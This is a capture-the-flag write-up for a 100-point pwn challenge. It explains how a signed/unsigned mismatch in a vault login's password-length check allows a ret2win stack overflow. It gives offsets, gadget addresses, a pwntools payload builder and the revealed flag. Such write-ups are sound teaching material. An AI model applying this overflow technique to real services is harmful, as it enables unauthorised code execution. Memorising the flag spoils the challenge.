# The Password is Swordfish

## Metadata

| Field | Value |
| --- | --- |
| Category | `pwn` |
| Difficulty | Easy |
| Points | 100 |
| Solves | 131 |
| First Blood | Urck |

## Challenge Description

```text
FluidSec shipped a shiny new Vault auth service. The dev team swears the
password length check is bulletproof. They swear a lot.
```

Target used during validation:

```text
24ab566e9b9668e2.chal.ctf.ae:443
```

The service is TLS-wrapped, so the remote exploit uses pwntools with `ssl=True`
and SNI set to the hostname.

## Artifacts

The provided archive contained:

```text
public.zip
work/vault
```

Artifacts produced during the solve:

```text
.venv/                         # local pwntools environment
vault.asm                      # local disassembly dump already present
exploit.py                     # final pwntools exploit
assets/local/01_payload_metadata.json
assets/local/02_output.txt
assets/remote/01_payload_metadata.json
assets/remote/02_output.txt
```

## Recon

I started with the usual pwn triage: identify the binary, check symbols, and
look for strings that describe the intended target.

```bash
file work/vault
nm -n work/vault | rg ' win$| login$| main$| exit$'
strings -a work/vault | rg -n 'flag|Password|5w0rdf|Access|length|vault'
```

Relevant output:

```text
work/vault: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
0000000000401b85 T win
0000000000401c03 T login
0000000000401d2e T main
000000000040b0d0 T exit
/flag.txt
Error: could not read flag.
Password length:
Password:
5w0rdf1sh
Access granted. Welcome back, admin.
Access denied.
```

The string `/flag.txt` did not mean the flag was hardcoded. It meant there was
probably a function that opens the flag file. The symbol table confirmed a
non-stripped `win()` function, so I opened the binary in Ghidra to understand
whether that function was reachable.

In Ghidra, the Program Information view showed the loaded program as `vault`,
architecture `x86:LE:64`, image base `0x00400000`, and analysis complete. In the
Symbol Tree, `main`, `login`, and `win` were named functions, which made the
first reverse-engineering pass straightforward.

The decompiler showed `main()` only sets buffering, prints the banner, and calls
`login()`:

```c
undefined8 main(void)
{
  setbuf((FILE *)stdin,(char *)0x0);
  setbuf((FILE *)stdout,(char *)0x0);
  setbuf((FILE *)stderr,(char *)0x0);
  puts("  FluidSec Vault v2.0 - Secure Login");
  puts("Authenticate to access the vault.");
  login();
  return 0;
}
```

Then I followed the `/flag.txt` string in Ghidra. Its only useful reference led
to `win()`:

```c
void win(void)
{
  local_10 = fopen64("/flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Error: could not read flag.");
  }
  else {
    pcVar1 = fgets(local_98,0x80,local_10);
    if (pcVar1 != (char *)0x0) {
      puts(local_98);
    }
    fclose(local_10);
  }
}
```

So the goal became a ret2win: redirect control flow from `login()` to
`win()`.

I also tested the password-looking string because the challenge title points at
it:

```bash
printf '9\n5w0rdf1sh\n' | ./work/vault
```

Output:

```text
Password length: Password: Access granted. Welcome back, admin.
```

That confirmed the password exists, but it is not enough. The normal success
path does not call `win()` and does not read `/flag.txt`.

## Vulnerability

The bug is a signed/unsigned mismatch in `login()` that turns a negative length
into an unbounded write loop.

I did not start by assuming a stack overflow. The useful clue from recon was the
program flow: `main()` always calls `login()`, the normal password success path
does not call `win()`, and the only user-controlled value before the password
bytes is the "Password length" field. That made the length field the natural
place to inspect as data flow: how it is parsed, how it is checked, and how it
is later used as the copy bound.

The Ghidra decompiler showed:

```c
uint local_5c;
char local_58 [72];
int local_10;
uint local_c;

scanf("%d",&local_5c);
...
if (0x40 < (int)local_5c) {
  puts("Too long! Max 64 characters.");
  exit(1);
}
...
for (local_c = 0; local_c < local_5c; local_c = local_c + 1) {
  local_10 = getchar();
  if ((local_10 == -1) || (local_10 == 10)) break;
  local_58[local_c] = (char)local_10;
}
local_58[local_c] = '\0';
```

The important detail is not just "there is a length check." The length check and
the loop use different signedness assumptions:

```text
check:  if ((int)len <= 64)       # signed
loop:   while (counter < len)     # unsigned
```

The Ghidra Listing view made that visible at the instruction level:

```asm
401c70: mov eax,DWORD PTR [rbp-0x54]
401c73: cmp eax,0x40
401c76: jle 401c91
...
401ce1: mov eax,DWORD PTR [rbp-0x54]
401ce4: cmp DWORD PTR [rbp-0x4],eax
401ce7: jb  401cbd
```

With `len = -1`:

```text
signed comparison:   -1 <= 64        -> accepted
unsigned loop value: 0xffffffff      -> huge loop bound
```

Before building the exploit, I cross-checked this pattern against CWE-195:
signed to unsigned conversion errors can turn negative values into unexpectedly
large unsigned values and lead to buffer overflows. I also compared the overall
goal with standard ret2win writeups: if the program already contains a function
that prints the flag and the binary is non-PIE, the exploit can reuse that
function instead of injecting shellcode.

The binary's mitigation output was:

```bash
.venv/bin/pwn checksec work/vault
```

```text
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

`checksec` reports canary support in the static binary, but I verified the
actual vulnerable function in Ghidra and in `objdump`: `login()` has no stack
canary prologue such as `fs:0x28` and no canary check before `leave; ret`.
`checksec` also reports SHSTK/IBT notes, but the local and remote executions
confirmed that a normal saved-return-address overwrite was accepted by the
challenge environment.
Because the executable is non-PIE, `win()` is at a fixed address:

```text
win = 0x401b85
```

## Exploitation

The exploit chain is:

1. Send `-1` as the password length.
2. Overflow `local_58`.
3. Preserve the loop counter when the overflow reaches it.
4. Overwrite the saved return address with a short ret2win chain.
5. Return into `win()`.
6. Let `win()` print `/flag.txt`.

The stack layout from the Ghidra Listing is:

```text
len / local_5c      -> rbp-0x54
password buffer     -> rbp-0x50
temporary char      -> rbp-0x8
loop counter        -> rbp-0x4
saved rbp           -> rbp
saved rip           -> rbp+0x8
```

That gives two important offsets:

```text
offset to loop counter = (rbp-0x4) - (rbp-0x50) = 76
offset to saved RIP    = (rbp+0x8) - (rbp-0x50) = 88
```

The loop counter matters. If the payload simply sends 88 bytes of padding, the
write at offset `76` corrupts `local_c` and the loop stops progressing
normally. At that moment the counter value is `0x4c` (`76` decimal), so the
payload writes the little-endian 32-bit value `p32(0x4c)` at offset 76.

The final payload shape is:

```text
-1\n
"A" * 76
p32(0x4c)
"B" * 8
p64(0x40101a)    # ret alignment gadget
p64(0x401b85)    # win()
p64(0x40b0d0)    # exit()
\n
```

I used the `ret` at `0x40101a` from `_init`:

```asm
401016: add rsp,0x8
40101a: ret
```

It gives a clean single-ret alignment before entering `win()`.

## Exploit Artifact

`exploit.py` is the final pwntools exploit. It uses:

```python
ELF("./work/vault")
process(elf.path)
remote(host, port, ssl=True, sni=host)
flat(...)
```

The core payload builder is:

```python
def build_payload():
    return (
        b"-1\n"
        + b"A" * 76
        + flat(0x4c, word_size=32)
        + b"B" * 8
        + flat(0x40101a, elf.sym["win"], elf.sym["exit"])
        + b"\n"
    )
```

Local validation:

```bash
.venv/bin/python exploit.py --local --evidence-dir assets/local
```

Output:

```text
Password length: Password: Access denied.
Error: could not read flag.
```

This is the expected local result. The local machine does not have `/flag.txt`,
but reaching the `Error: could not read flag.` branch proves execution reached
`win()`.

Remote validation:

```bash
.venv/bin/python exploit.py --evidence-dir assets/remote
```

Output:

```text
Password length: Password: Access denied.
flag{704a20e57c218a5b}
```

The payload metadata is saved in `assets/remote/01_payload_metadata.json`:

```json
{
  "counter_value": "0x4c",
  "exit": "0x40b0d0",
  "host": "24ab566e9b9668e2.chal.ctf.ae",
  "offset_to_counter": 76,
  "offset_to_rip": 88,
  "payload_length": 116,
  "ret": "0x40101a",
  "win": "0x401b85"
}
```

The remote output is saved in `assets/remote/02_output.txt`.

## Technical Details

The exploit works because the input length is read as a signed decimal value
with `scanf("%d", ...)`, but Ghidra recovered the storage as `uint local_5c`.
The compiler-generated code then mixes signed and unsigned branches:

```text
jle -> signed <= 64 check
jb  -> unsigned counter < len loop
```

Negative values satisfy the upper-bound check, but become huge loop bounds.
This is exactly the type of issue described by CWE-195.

The binary is not PIE, so the ret2win address is stable. NX prevents shellcode,
but shellcode is unnecessary because the program already contains `win()`.
Partial RELRO is not relevant for this solve because the exploit does not need
a GOT overwrite.

## Validation

Syntax check:

```bash
.venv/bin/python -m py_compile exploit.py
```

Mitigation check:

```bash
.venv/bin/pwn checksec work/vault
```

Local exploit:

```bash
.venv/bin/python exploit.py --local --evidence-dir assets/local
```

Remote exploit:

```bash
.venv/bin/python exploit.py --evidence-dir assets/remote
```

Result:

```text
flag{704a20e57c218a5b}
```

## References

- <https://cwe.mitre.org/data/definitions/195.html>
- <https://docs.pwntools.com/en/stable/tubes/sockets.html>
- <https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win>

## Flag

```text
flag{704a20e57c218a5b}
```
